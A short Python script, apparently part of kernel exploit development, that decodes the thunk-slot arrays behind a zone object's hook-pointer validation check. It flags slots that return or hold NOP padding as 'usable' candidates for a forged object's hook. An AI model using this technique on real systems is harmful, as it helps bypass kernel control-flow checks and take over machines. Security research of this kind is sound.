#!/usr/bin/env python3
"""WP17-C1b — decode the hook-validation thunk arrays of the zone-drain fn.

The zone object's hooks (+0x98/+0xa8/+0xb8) are validated:
    lea rax, TABLE_END ; sub rax, hook ; ror rax,3 ; cmp rax, N ; ja warn
=> hook must be TABLE_END - k*8 for k in [0..N]  (8-byte thunk slots).

Decode every thunk slot: E9 rel32 -> real target, disasm the target head,
find benign (ret / NULL-safe) candidates for a seeded zone's hook3.
"""
import struct, subprocess, sys
sys.path.insert(0, "./scripts")
import kdis

TABLES = [
    ("hook1 +0x98", 0xFFFFFFFF9E65EDB0, 0x0C),
    ("hook2 +0xa8", 0xFFFFFFFF9E65AF68, 0x10B),
    ("hook3 +0xb8", 0xFFFFFFFF9E6581D8, 0x13),
]

def dis_n(va, n=6):
    return kdis.dis(va, n)

for name, end, n in TABLES:
    print(f"\n===== {name}: thunk array [{end:#x} - {n*8:#x}, {end:#x}] ({n+1} slots) =====")
    for k in range(n, -1, -1):
        slot = end - k * 8
        q = struct.unpack("<Q", kdis.read(slot, 8))[0]
        b = kdis.read(slot, 8)
        if b[0] == 0xE9:
            rel = struct.unpack("<i", b[1:5])[0]
            tgt = slot + 5 + rel
            print(f"  slot {slot:#x} (k={k:3d}) -> thunk jmp {tgt:#x}")
        elif b[0] == 0xC3:
            print(f"  slot {slot:#x} (k={k:3d}) -> RET (no-op!)  bytes={b.hex()}")
        elif all(x == 0x90 for x in b):
            print(f"  slot {slot:#x} (k={k:3d}) -> DEAD (NOP pad) -- usable!")
        else:
            print(f"  slot {slot:#x} (k={k:3d}) -> ??? bytes={b.hex()}")
